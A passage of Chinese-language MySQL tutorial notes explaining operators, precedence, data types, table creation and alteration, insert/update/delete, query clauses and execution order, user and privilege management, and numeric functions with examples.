  （5）*	匹配零个或多个在它前面的字符。例如，“x*”匹配任何数量的‘x’字符，“[0-9]*”匹配任何数量的数字,而“*”匹配任何数量的任何字符。
  ```

  ![image-20220705111506394](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8b6252cb8a4db3ed9261a6b043647f03-8411a57.png)

### 逻辑运算符

MySQL中支持4种逻辑运算符如下：

| 运算符        | 作用     | 示例             |
| ------------- | -------- | ---------------- |
| `AND` 或 `&&` | 逻辑与   | `SELECT A && B`  |
| `OR` 或 `||`  | 逻辑或   | `SELECT A || B`  |
| `NOT` 或 `!`  | 逻辑非   | `SELECT NOT B`   |
| `XOR`         | 逻辑异或 | `SELECT A XOR B` |

- **逻辑与运算符**

  逻辑与（`AND`或`&&`）运算符是当给定的所有值均为非0值，并且都不为NULL时，返回1；当给定的一个值或者多个值为0时则返回0；否则返回NULL。

  ![image-20220705162417398](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/083e9780c3370007e04a93ff60f11b93-e5e93d4.png)

- **逻辑或运算符**

  逻辑或（`OR`或`||`）运算符是当给定的值都不为NULL，并且任何一个值为非0值时，则返回1，否则返回0；当一个值为NULL，并且另一个值为非0值时，返回1，否则返回NULL；当两个值都为NULL时，返回NULL。

  ![image-20220705162525765](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f9e403b47cd9a7d0e2ddb7ae100ab46e-14ef01b.png)

  > OR可以和AND一起使用，但是在使用时要注意两者的优先级，由于AND的优先级高于OR，因此先对AND两边的操作数进行操作，再与OR中的操作数结合

- **逻辑非运算符**

  逻辑非（`NOT`或`!`）运算符表示当给定的值为0时返回1；当给定的值为非0值时返回0；当给定的值为NULL时，返回NULL。

  ![image-20220705162636209](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/72ffd747c57da1fdc0a62ff9455fab22-17653cc.png)

- **逻辑异或运算符** 

  逻辑异或（`XOR`）运算符是当给定的值中任意一个值为NULL时，则返回NULL；如果两个非NULL的值都是0或者都不等于0时，则返回0；如果一个值为0，另一个值不为0时，则返回1。

  ![image-20220705163817068](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a0f91db337374e536331a127518db191-7d97ea9.png)

### 位运算符

位运算符是在二进制数上进行计算的运算符。位运算符会先将操作数变成二进制数，然后进行位运算，最后将计算结果从二进制变回十进制数。

MySQL支持的位运算符如下:

| 运算符 | 作用            | 示例            |
| ------ | --------------- | --------------- |
| `&`    | 按位与(位AND)   | `SELECT A & B`  |
| `|`    | 按位或(位OR)    | `SELECT A | B`  |
| `^`    | 按位异或(位XOR) | `SELECT A ^ B`  |
| `~`    | 按位取反        | `SELECT ~ A`    |
| `>>`   | 按位右移        | `SELECT A >> 2` |
| `<<`   | 按位左移        | `SELECT A << 2` |

- **按位与运算符**

  按位与（`&`）运算符将给定值对应的二进制数**逐位**进行**逻辑与**运算。当给定值对应的二进制位的数值都为1时，则该位返回1，否则返回0。

  ![image-20220705163245044](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/989392f1dc8b9a89703cf8dcdbcc5791-5fa0bfa.png)

  ```
  - 1的二进制数为0001，10的二进制数为1010，所以1 & 10的结果为0000，对应的十进制数为0。
  - 20的二进制数为10100，30的二进制数为11110，所以20 & 30的结果为10100，对应的十进制数为20。
  ```

  ![image-20220705163924499](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5c8518a1f41cb925803acb40e7bf85af-c6e8910.png)

- **按位或运算符**

  按位或（`|`）运算符将给定的值对应的二进制数**逐位**进行**逻辑或**运算。当给定值对应的二进制位的数值有一个或两个为1时，则该位返回1，否则返回0。

  ![image-20220705163519020](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2a1b89a33731acb4abfee6eead655474-ef949f3.png)

  ```
  - 1的二进制数为0001，10的二进制数为1010，所以1 | 10的结果为1011，对应的十进制数为11。
  - 20的二进制数为10100，30的二进制数为11110，所以20 | 30的结果为11110，对应的十进制数为30。
  ```

  ![image-20220705163951001](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d9526563a808aa2bb6064efc1ad107f8-8db7393.png)

- **按位异或运算符**

  按位异或（`^`）运算符将给定的值对应的二进制数**逐位**进行**逻辑异或**运算。当给定值对应的二进制位的数值不同时，则该位返回1，否则返回0。

  ![image-20220705163731301](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a213ee77ca2dc1386b1b6eca88d72be3-8437a5c.png)

  ```
  - 1的二进制数为0001，10的二进制数为1010，所以1 ^ 10的结果为1011，对应的十进制数为11。
  - 20的二进制数为10100，30的二进制数为11110，所以20 ^ 30的结果为01010，对应的十进制数为10。
  ```

  ![image-20220705164003169](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/db798bc395ccf50ea941f02f6e840870-2409781.png)

- **按位取反运算符** 

  按位取反（`~`）运算符将给定的值的二进制数**逐位**进行**取反**操作，即将1变为0，将0变为1。

  ![image-20220705165925877](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbbae16149e3ecff74a34c22dd0d21c1-03e7f79.png)

  ```
  由于按位取反（~）运算符的优先级高于按位与（&）运算符的优先级，所以10 & ~1中首先对数字1进行按位取反操作，结果除了最低位为0，其他位都为1，然后与10进行按位与操作，结果为10。
  ```

- **按位右移运算符**

  按位右移（`>>`）运算符将给定的值的二进制数的所有位**右移指定的位数**。右移指定的位数后，右边低位的数值被移出并丢弃，左边高位空出的位置用0补齐。

  ![image-20220705170032268](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3977f4622d2e174c49baadbf248b000f-9900f92.png)

  ```
  - 1的二进制数为0000 0001，右移2位为0000 0000，对应的十进制数为0。
  - 4的二进制数为0000 0100，右移2位为0000 0001，对应的十进制数为1。
  ```

- **按位左移运算符**

  按位左移（`<<`）运算符将给定的值的二进制数的所有位**左移指定的位数**。左移指定的位数后，左边高位的数值被移出并丢弃，右边低位空出的位置用0补齐。

  ![image-20220705170246024](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8b0d05e9bb44638f0ee080628e6af7e4-9312172.png)

  ```
  - 1的二进制数为0000 0001，左移两位为0000 0100，对应的十进制数为4。
  - 4的二进制数为0000 0100，左移两位为0001 0000，对应的十进制数为16。
  ```

### 空值参与运算

所有运算符或列值遇到 `null` 值，运算的结果都为`null` 

> 在 MySQL 里面， 空值不等于空字符串。一个空字符串的长度是 0，而一个空值的长度是空。
>
> 而且，在 MySQL 里面，空值是占用空间的

###  运算符的优先级

| 优先级 | 运算符                                                       |
| :----: | ------------------------------------------------------------ |
|   1    | `:=`, `=`                                                    |
|   2    | `||` , `OR` , `XOR`                                          |
|   3    | `&&` , `AND`                                                 |
|   4    | `NOT`                                                        |
|   5    | `BETWEEN AND`, `CASE`, `WHEN`, `THEN`, `ELSE`                |
|   6    | `=`(比较) , `<=>`, `>=`, `<=`, `<`, `>`, `<>`, `!=`, `IS`, `LIKE`, `REGEXP`, `IN` |
|   7    | `|`                                                          |
|   8    | `&`                                                          |
|   9    | `<<`,  `>>`                                                  |
|   10   | `-`, `+`                                                     |
|   11   | `*`, `/` , `%`                                               |
|   12   | `^`(按位异或)                                                |
|   13   | `-`(负号),  `~`(按位取反)                                    |
|   14   | `!`                                                          |
|   15   | `()`                                                         |

> 数字编号越大，优先级越高，优先级高的运算符先进行计算。
>
> 可以看到，赋值运算符的优先级最低，使用`()`括起来的表达式的优先级最高。

## DDL

**Data Definition Language**，数据定义语言，用来定义数据库对象(数据库，表，字段) 。

### 数据库操作

- 查询所有数据库

  ```mysql
  show databases; 
  ```

- 查询当前数据库

  ```mysql
  select database(); 
  ```

- 创建数据库

  ```mysql
  create database [if not exists] 数据库名 [default charset 字符集 ] [collate 排序规则];
  ```

- 删除数据库

  ```mysql
  drop database [ if exists ] 数据库名;
  ```

- 切换数据库

  ```mysql
  use 数据库名; 
  ```

使用示例

```mysql
-- 创建一个itheima数据库，并且指定字符集
create database if not extists ni9nes_DB default charset utf8mb4;

-- 删除数据库
drop database if exists ni9nes_DB;
```

### 表操作

#### 表操作-查询创建

- 查询当前数据库所有表

  ```mysql
  show tables; 
  ```

-  查看指定表结构

  ```mysql
  desc 表名;
  ```

  > 通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信
  > 息。

- 查询指定表的建表语句

  ```mysql
  show create table 表名; 
  ```

  > 这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询
  > 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。

- 创建表结构

  ```mysql
  CREATE TABLE 表名(
  字段1 字段1类型 [ COMMENT 字段1注释 ],
  字段2 字段2类型 [COMMENT 字段2注释 ],
  字段3 字段3类型 [COMMENT 字段3注释 ],
  ......
  字段n 字段n类型 [COMMENT 字段n注释 ]
  ) [ COMMENT 表注释 ] ;
  ```

  ![image-20220707161926712](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9dfac63ec776e6735184c4e9254c7a3f-b8f2689.png)

#### 表操作-数据类型

MySQL中的数据类型有很多，主要分为三类：**数值类型**、**字符串类型**、**日期时间类型**。

##### 数值类型

| 类型              | 大小   | 有符号(SIGNED)范围                                        | 无符号(UNSIGNED)范围                                         | 描述                   |
| ----------------- | ------ | --------------------------------------------------------- | ------------------------------------------------------------ | ---------------------- |
| `TINYINT`         | 1byte  | (-128，127)                                               | (0，255)                                                     | 小整数值               |
| `SMALLINT`        | 2bytes | (-32768，32767)                                           | (0，65535)                                                   | 大整数值               |
| `MEDIUMINT`       | 3bytes | (-8388608，8388607)                                       | (0，16777215)                                                | 大整数值               |
| `INT`/I`NTEGER  ` | 4bytes | (-2147483648，  2147483647)                               | (0，4294967295)                                              | 大整数值               |
| `BIGIN`T          | 8bytes | (-2^63，2^63-1)                                           | (0，2^64-1)                                                  | 极大整数值             |
| `FLOAT`           | 4bytes | (-3.402823466 E+38，  3.402823466351  E+38)               | 0 和  (1.175494351 E-  38，3.402823466  E+38)                | 单精度浮点数值         |
| `DOUBLE`          | 8bytes | (-1.7976931348623157  E+308，  1.7976931348623157  E+308) | 0 和  (2.2250738585072014  E-308，  1.7976931348623157  E+308) | 双精度浮点数值         |
| `DECIMAL`         |        | 依赖于M(精度)和D(标度) 的值                               | 依赖于M(精度)和D(标度)的值                                   | 小数  值(精  确定点数) |

```
如:
1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大
age tinyint unsigned
2). 分数 -- 总分100分, 最多出现一位小数
score double(4,1)
```

##### 字符串类型

| **类型**     | **大小**               | **描述**                     |
| ------------ | ---------------------- | ---------------------------- |
| `CHAR`       | 0-255  bytes           | 定长字符串(需要指定长度)     |
| `VARCHAR `   | 0-65535  bytes         | 变长字符串(需要指定长度)     |
| `TINYBLOB`   | 0-255  bytes           | 不超过255个字符的二进制数据  |
| `TINYTEXT`   | 0-255  bytes           | 短文本字符串                 |
| `BLOB `      | 0-65  535 bytes        | 二进制形式的长文本数据       |
| `TEXT`       | 0-65  535 bytes        | 长文本数据                   |
| `MEDIUMBLOB` | 0-16  777 215 bytes    | 二进制形式的中等长度文本数据 |
| `MEDIUMTEXT` | 0-16  777 215 bytes    | 中等长度文本数据             |
| `LONGBLOB`   | 0-4  294 967 295 bytes | 二进制形式的极大文本数据     |
| `LONGTEXT`   | 0-4  294 967 295 bytes | 极大文本数据                 |

char 与 varchar 都可以描述字符串
char是定长字符串，指定长度多长，就占用多少个字符，和字段值的长度无关.
而varchar是变长字符串，指定的长度为最大占用长度.
相对来说，char的性能会更高些。

```
如：
1). 用户名 username ------> 长度不定, 最长不会超过50
username varchar(50)
2). 性别 gender ---------> 存储值, 不是男,就是女
gender char(1)
3). 手机号 phone --------> 固定长度为11
phone char(11)
```

##### 日期时间类型

| **类型**      | **大小** | **范围**                                      | **格式**             | **描述**                 |
| ------------- | -------- | --------------------------------------------- | -------------------- | ------------------------ |
| `DATE`        | 3        | 1000-01-01  至  9999-12-31                    | YYYY-MM-DD           | 日期值                   |
| `TIME`        | 3        | -838:59:59  至 838:59:59                      | HH:MM:SS             | 时间值或持续时间         |
| `YEAR`        | 1        | 1901  至 2155                                 | YYYY                 | 年份值                   |
| `DATETIME`    | 8        | 1000-01-01  00:00:00 至  9999-12-31  23:59:59 | YYYY-MM-DD  HH:MM:SS | 混合日期和时间值         |
| `TIMESTAMP  ` | 4        | 1970-01-01  00:00:01 至  2038-01-19  03:14:07 | YYYY-MM-DD  HH:MM:SS | 混合日期和时间值，时间戳 |

```
如:
1). 生日字段 birthday
birthday date
2). 创建时间 createtime
createtime datetime
```

#### 表操作-案例

```
设计一张员工信息表，要求如下：
1. 编号（纯数字）
2. 员工工号 (字符串类型，长度不超过10位)
3. 员工姓名（字符串类型，长度不超过10位）
4. 性别（男/女，存储一个汉字）
5. 年龄（正常人年龄，不可能存储负数）
6. 身份证号（二代身份证号均为18位，身份证中有X这样的字符）
7. 入职时间（取值年月日即可）
```

对应的建表语句如下:

```mysql
create table emp(
    id 			int 		comment '编号',
    workno 		varchar(10) comment '工号',
    name 		varchar(10) comment '姓名',
    gender 		char(1) 	comment '性别',
    age 		tinyint unsigned 	comment '年龄',
    idcard 		char(18) 	comment '身份证号',
    entrydate 	date 		comment '入职时间'
) comment '员工表';
```

![image-20220707163016487](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3af6ea4802347da0d64b046919c25d18-882e3bc.png)

#### 表操作-修改

- 添加字段

  ```mysql
  ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ]; 
  ```

  ```mysql
  -- 如 , 为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)
  ALTER TABLE emp ADD nickname varchar(20) COMMENT '昵称';
  ```

- 修改数据类型

  ```mysql
  ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度); 
  ```

- 修改字段名和字段类型

  ```mysql
  ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];
  ```

  ```mysql
  -- 如, 将emp表的nickname字段修改为username，类型为varchar(30)
  ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '昵称'; 
  ```

- 删除字段

  ```mysql
  ALTER TABLE 表名 DROP 字段名; 
  ```

  ```mysql
  -- 如, 将emp表的字段username删除
  ALTER TABLE emp DROP username; 
  ```

- 修改表名

  ```mysql
  ALTER TABLE 表名 RENAME TO 新表名; 
  ```

  ```mysql
  -- 如, 将emp表的表名修改为 employee
  ALTER TABLE emp RENAME TO employee; 
  ```

#### 表操作-删除

- 删除表

  ```mysql
  DROP TABLE [ IF EXISTS ] 表名; 
  ```

  > 可选项 IF EXISTS 代表，只有表名存在时才会删除该表，表名不存在，则不执行删除操作(如果不加该参数项，删除一张不存在的表，执行将会报错)。

  ```mysql
  -- 如, 如果tb_user表存在，则删除tb_user表
  DROP TABLE IF EXISTS tb_user; 
  ```

- 清空表数据

  ```mysql
  TRUNCATE TABLE 表名; 
  ```

## DML

**Data Manipulation Language**(数据操作语言)，用来对数据库中表的数据记录进行增、删、改操作。

- 添加数据（INSERT）
- 修改数据（UPDATE）
- 删除数据（DELETE）

### 添加数据

- 给指定字段添加数据

    ```mysql
    INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...); 
    ```

    ```mysql
    -- 如, 给employee表所有的字段添加数据
    insert into emp(id,workno,name,gender,age,idcard,entrydate)
    values(1,'1','ni9ne','男',10,'123456789012345678','2000-01-01');
    ```

- 给全部字段添加数据

    ```mysql
    INSERT INTO 表名 VALUES (值1, 值2, ...); 
    ```

    ```mysql
    -- 如, 给employee表所有的字段添加数据
    insert into employee values(2,'2','usern','男',18,'123456789012345670','2005-01-01');
    ```

- 批量添加数据

  ```mysql
  INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...);
  
  INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...) ; 
  ```
  
  ```mysql
  -- 如, 批量插入数据到employee表
  insert into emp values
      (3,'3','user1','男',38,'123456789012345670','2005-01-01'),
      (4,'4','user2','女',18,'123456789012345670','2005-01-01');
  ```
  
  **注意事项:** 
  •  插入数据时，指定的字段顺序需要与值的顺序是一一对应的。
  •  字符串和日期型数据应该包含在引号中。
  •  插入的数据大小，应该在字段的规定范围内。

### 修改数据

修改数据的具体语法为:

```mysql
UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ; 
```

```mysql
-- 如, 修改id为1的数据，将name修改为 user_new
update emp set name = 'user_new' where id = 1; 
```

**注意事项:** 

修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据。

### 删除数据

删除数据的具体语法为：

```mysql
DELETE FROM 表名 [ WHERE 条件 ] ; 
```

```mysql
-- 如, 删除gender为女的员工
delete from emp where gender = '女'; 
```

**注意事项:**

•  DELETE 语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据。
•  DELETE 语句不能删除某一个字段的值 (可以使用UPDATE，将该字段值置为NULL即可)。

## DQL

**Data Query Language**(数据查询语言)，数据查询语言，用来查询数据库中表的记录。

### 基本语法

DQL 查询语句，语法结构如下：

```mysql
SELECT 	字段列表
FROM 	表名列表
WHERE 	条件列表
GROUP BY 分组字段列表
HAVING 	分组后条件列表
ORDER BY 排序字段列表
LIMIT 	分页参数
```

### 基础查询

在基本查询的DQL语句中，不带任何的查询条件，查询的语法如下：

#### 查询多个字段

```mysql
-- 语法:
SELECT 字段1, 字段2, 字段3 ... FROM 表名 ; 
SELECT * FROM 表名 ; 
```

> 注意 : * 号代表查询所有字段，在实际开发中尽量少用（不直观、影响效率）。

#### 字段设置别名

```mysql
-- 语法:
SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名; 
SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名; 
```

在列名之后加入关键字`AS`, 代表给该字段起别名。

别名可以使用双引号，以便在别名中包含空格或特殊的字符并区分大小写。

关键字 `AS` 可以省略

#### 去除重复记录

默认情况下，查询会返回全部行，包括重复行。在SELECT语句中使用关键字 `DISTINCT` 去除重复行

```mysql
SELECT DISTINCT 字段列表 FROM 表名; 
```

有两点需要注意：

- DISTINCT 需要放到所有列名的前面，如果写成 以下方式会**报错**。

  ```mysql
  SELECT salary, DISTINCT department_id FROM employees 
  ```

- DISTINCT 其实是对后面所有列名的组合进行去重

### 条件查询

```mysql
-- 语法:
SELECT 字段列表 FROM 表名 WHERE 条件列表 ; 
```

```mysql
-- 如, 查询年龄等于 88 的员工
select * from emp where age = 88; 
-- 查询有身份证号的员工信息
select * from emp where idcard is not null; 
-- 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息
select * from emp where age between 15 and 20;
```

### 聚合函数

将一列数据作为一个整体，进行纵向计算 。

常见的聚合函数:

| **函数** | **功能** |
| -------- | -------- |
| count    | 统计数量 |
| max      | 大值     |
| min      | 小值     |
| avg      | 平均值   |
| sum      | 求和     |

```mysql
-- 语法:
SELECT 聚合函数(字段列表) FROM 表名 ; 
```

> 注意 : NULL值是不参与所有聚合函数运算的。

```mysql
-- 如, 统计该企业员工数量
select count(*) from emp; -- 统计的是总记录数
select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数
-- 统计该企业员工的平均年龄
select avg(age) from emp; 
-- 统计西安地区员工的年龄之和
select sum(age) from emp where workaddress = '西安'; 
```

### 分组查询

```mysql
-- 语法
SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后过滤条件 ];
```

```mysql
-- 如, 根据性别分组, 统计男性员工和女性员工的数量
select gender, count(*) from emp group by gender ; 
-- 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址
select workaddress, count(*) address_count from emp 
where age < 45 
group by workaddress 
having address_count >= 3;
-- 统计各个工作地址上班的男性及女性员工的数量
select workaddress, gender, count(*) '数量' from emp group by gender, workaddress;
```

**注意事项**:

•  分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义。
•  执行顺序: `where` > 聚合函数 > `having` 。
•  支持多字段分组, 具体语法为 : `group by columnA,columnB`

 **`where`与`having`区别**

- 执行时机不同：`where`是**分组之前**进行过滤，不满足`where`条件，不参与分组；而`having`是**分组之后**对结果进行过滤。
- 判断条件不同：`where`不能对聚合函数进行判断，而`having`可以

**`WITH ROLLUP` 使用**

使用 `WITH ROLLUP` 关键字之后，在所有查询出的分组记录之后增加一条记录，该记录计算查询出的所
有记录的总和，即统计记录数量。

```mysql
-- 根据性别分组 , 统计男性员工、女性员工的平均年龄, 及全部员工的平均年龄
select gender, avg(age) from emp group by gender with rollup; 
```

![image-20220707171949006](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/38b6127cddb1dd0925396e7ea31db5bc-ed94968.png)

> 当使用ROLLUP时，不能同时使用ORDER BY子句进行结果排序，即ROLLUP和ORDER BY是互相排斥的

### 排序查询

```mysql
-- 语法:
SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ; 
```

排序方式

- `ASC` : 升序(默认值)
- `DESC`: 降序

```mysql
-- 如, 根据年龄对公司的员工进行升序排序
select * from emp order by age asc;
-- 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序
select * from emp order by age asc , entrydate desc; 
```

**注意:**

可以使用不在SELECT列表中的列排序。

在对多列进行排序的时候，首先排序的第一列必须有相同的列值，才会对第二列进行排序。如果第一列数据中所有值都是唯一的，将不再对第二列进行排序。

### 分页查询

MySQL中使用 `LIMIT` 实现分页, 格式:

```mysql
SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ; 
```

**注意事项:** 

•  起始索引从0开始，`起始索引 = （查询页码 - 1）* 每页显示记录数`。
•  分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是`LIMIT`。
•  如果查询的是第一页数据，起始索引可以省略，直接简写为 `limit 10`。

```mysql
-- 如, 查询第1页员工数据, 每页展示10条记录
select * from emp limit 0,10;
-- 查询第2页员工数据, 每页展示10条记录    (页码-1)*页展示记录数
select * from emp limit 10,10; 
```

### 执行顺序

![image-20220707173247097](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d853fafde5669486800d47f66b494e48-a876385.png)

比如一个 SQL 语句，那么它的关键字顺序和执行顺序是下面这样的:

```mysql
SELECT DISTINCT player_id, player_name, count(*) as num 	# 顺序 5
FROM player JOIN team ON player.team_id = team.team_id 		# 顺序 1
WHERE height > 1.80 			# 顺序 2
GROUP BY player.team_id 		# 顺序 3
HAVING num > 2 					# 顺序 4
ORDER BY num DESC 				# 顺序 6
LIMIT 2 						# 顺序 7
```

在 SELECT 语句执行这些步骤的时候，每个步骤都会产生一个 **虚拟表** ，然后将这个虚拟表传入下一个步
骤中作为输入。需要注意的是，这些步骤隐含在 SQL 的执行过程中，对于我们来说是不可见的。

### 执行原理

1. SELECT语句是先执行 **FROM** 这一步的。在这个阶段，如果是多张表联查，还会经历下面的几个步骤：

    ```
    1. 首先先通过 CROSS JOIN 求笛卡尔积，相当于得到虚拟表 vt（virtual table）1-1；
    2. 通过 ON 进行筛选，在虚拟表 vt1-1 的基础上进行筛选，得到虚拟表 vt1-2；
    3. 添加外部行。如果我们使用的是左连接、右链接或者全连接，就会涉及到外部行，也就是在虚拟表 vt1-2 的基础上增加外部行，得到虚拟表 vt1-3。

    如果操作的是两张以上的表，还会重复上面的步骤，直到所有表都被处理完为止。这个过程得到是原始数据。
    ```

2. 在虚拟表 vt1基础上再进行 **WHERE** 阶段 。在这个阶段中，会根据 vt1表的结果进行筛选过滤，得到虚拟表 vt2 。

3. 然后进入第三步和第四步，也就是  **GROUP** 和 **HAVING** 阶段 。在这个阶段中，实际上是在虚拟表 vt2 的基础上进行分组和分组过滤，得到中间的虚拟表  vt3 和  vt4 。

4. 进入到  **SELECT** 和 **DISTINCT**阶段 。首先在 SELECT 阶段会提取想要的字段，然后在 DISTINCT 阶段过滤掉重复的行，分别得到中间的虚拟表vt5-1 和  vt5-2 。

5. 当提取了想要的字段数据之后，就可以按照指定的字段进行排序，也就是 **ORDER BY** 阶段 ，得到虚拟表 vt6。

6. 最后在 vt6 的基础上，取出指定行的记录，也就是  **LIMIT** 阶段 ，得到最终的结果，对应的是虚拟表vt7 。

> 在写 SELECT 语句的时候，不一定存在所有的关键字，相应的阶段就会省略

## DCL

**Data Control Language**(数据控制语言)，用来管理数据库用户、控制数据库的访问权限。

### 管理用户

- 查询用户

  ```mysql
  select * from mysql.user; 
  ```

  ![image-20220707174342109](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3bb4db041c21281a42825822c642c84c-9a59222.png)

  其中 `Host`代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以远程访问的。 

  `User`代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一个用户。

- 创建用户

  ```mysql
  CREATE USER '用户名'@'主机名' IDENTIFIED BY '密码'; 
  ```

- 修改用户密码

  ```mysql
  ALTER USER '用户名'@'主机名' IDENTIFIED WITH mysql_native_password BY '新密码' ;
  ```

- 删除用户

  ```mysql
  DROP USER '用户名'@'主机名' ;  
  ```

**注意事项:** 

• 在MySQL中需要通过`用户名@主机名`的方式，来唯一标识一个用户。

• 主机名可以使用 `%` 通配，代表所有。

### 权限控制

MySQL中定义了很多种权限，但是常用的就以下几种：

| **权限**                 | **说明**           |
| ------------------------ | ------------------ |
| `ALL`,  `ALL PRIVILEGES` | 所有权限           |
| `SELECT`                 | 查询数据           |
| `INSERT`                 | 插入数据           |
| `UPDATE`                 | 修改数据           |
| `DELETE`                 | 删除数据           |
| `ALTER`                  | 修改表             |
| `DROP`                   | 删除数据库/表/视图 |
| `CREATE`                 | 创建数据库/表      |

上述只是简单罗列了常见的几种权限描述，其他权限描述及含义，可以直接参考官方文档。

```
https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html
```

- 查询权限

  ```mysql
  SHOW GRANTS FOR '用户名'@'主机名' ; 
  ```

- 授予权限

  ```mysql
  GRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名'; 
  ```

- 撤销权限

  ```mysql
  REVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名'; 
  ```

**注意事项：**

•  多个权限之间，使用逗号分隔

•  授权时， 数据库名和表名可以使用 `*` 进行通配，代表所有。



## 函数

MySQL提供了丰富的内置函数，这些函数使得数据的维护与管理更加方便，能够更好地提供数据的分析与统计功能，在一定程度上提高了开发人员进行数据分析与统计的效率。

MySQL提供的内置函数从 **实现的功能角度** 可以分为**数值函数**、**字符串函数**、**日期和时间函数**、**流程控制函数**、**加密与解密函数**、**获取MySQL信息函数**、**聚合函数**等。

### 数值函数

#### 基本函数

| **函数**                  | **用法**                                                     |
| ------------------------- | ------------------------------------------------------------ |
| `ABS(x)  `                | 返回x的绝对值                                                |
| ` SIGN(X)  `              | 返回X的符号。正数返回1，负数返回-1，0返回0                   |
| `PI()  `                  | 返回圆周率的值                                               |
| `CEIL(x)`，`CEILING(x) `  | 返回大于或等于某个值的最小整数                               |
| `FLOOR(x)  `              | 返回小于或等于某个值的最大整数                               |
| `LEAST(e1,e2,e3…)  `      | 返回列表中的最小值                                           |
| `  GREATEST(e1,e2,e3…)  ` | 返回列表中的最大值                                           |
| `MOD(x,y)  `              | 返回X除以Y后的余数                                           |
| `  RAND()  `              | 返回0~1的随机值                                              |
| `  RAND(x)  `             | 返回0~1的随机值，其中x的值用作种子值，相同的X值会产生相同的随数 |
| ` ROUND(x)  `             | 返回一个对x的值进行四舍五入后，最接近于X的整数               |
| ` ROUND(x,y)  `           | 返回一个对x的值进行四舍五入后 接近X的值，并保留到小数点后面Y位 |
| `TRUNCATE(x,y)  `         | 返回数字x截断为y位小数的结果                                 |
| `SQRT(x)  `               | 返回x的平方根。当X的值为负数时，返回NULL                     |
| `RADIANS(x)`              | 将角度转化为弧度，其中，参数x为角度值                        |
| `DEGREES(x)`              | 将弧度转化为角度，其中，参数x为弧度值                        |

**使用范例** 

 ```mysql
SELECT 
ABS(-123),ABS(32),SIGN(-23),SIGN(43),PI(),CEIL(32.32),CEILING(-43.23),FLOOR(32.32),FLOOR(-43.23),MOD(12,5);
 ```

![image-20220706195815666](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f5bca1efda8dc5b5edaaf0f5787ae394-b94aaf7.png)

```mysql
SELECT RAND(),RAND(),RAND(10),RAND(10),RAND(-1),RAND(-1);
```

![image-20220706195909263](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5615db74db433691532999a50e0ae891-7b295c2.png)

> 随机数rand()函数, 获取0~1之间的随机数值. 
>
> 支持传入参数, 代表随机数因子, 当传入相同因子时, 同一次获取到的随机数是相同的

```mysql
SELECT ROUND(12.33),ROUND(12.343,2),ROUND(12.324,-1),TRUNCATE(12.66,1),TRUNCATE(12.66,-1)
```

![image-20220706200555076](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/808dcab2e61529ce934d4543def80043-aafd8db.png)

```mysql
SELECT RADIANS(30),RADIANS(60),RADIANS(90),DEGREES(2*PI()),DEGREES(RADIANS(90));
```

![image-20220706201057191](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/931110c751cc58f92e897617a57b80c6-1f3fb8f.png)

#### 三角函数

| **函数**     | **用法**                                                     |
| ------------ | ------------------------------------------------------------ |
| `SIN(x)  `   | 返回x的正弦值，其中，参数x为弧度值                           |
